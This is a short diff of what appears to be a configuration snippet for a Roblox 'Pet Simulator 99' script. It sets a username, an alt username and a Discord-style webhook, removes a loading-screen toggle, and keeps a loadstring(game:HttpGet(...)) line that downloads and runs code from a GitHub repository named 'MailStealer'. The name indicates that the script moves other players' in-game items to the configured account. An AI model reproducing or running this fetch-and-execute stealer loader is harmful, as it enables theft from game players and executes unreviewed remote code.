@@ -5,7 +5,6 @@ Username = "YOUR USERNAME"
 Username2 = "ALT USERNAME"
 Loading = "LOADING"
 Webhook = "YOUR WEBHOOK"
-ToggleScreen = False -- change this to True if u want loading screen
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GengarScripts/MailStealer/main/PetSimulator99"))()
 ```
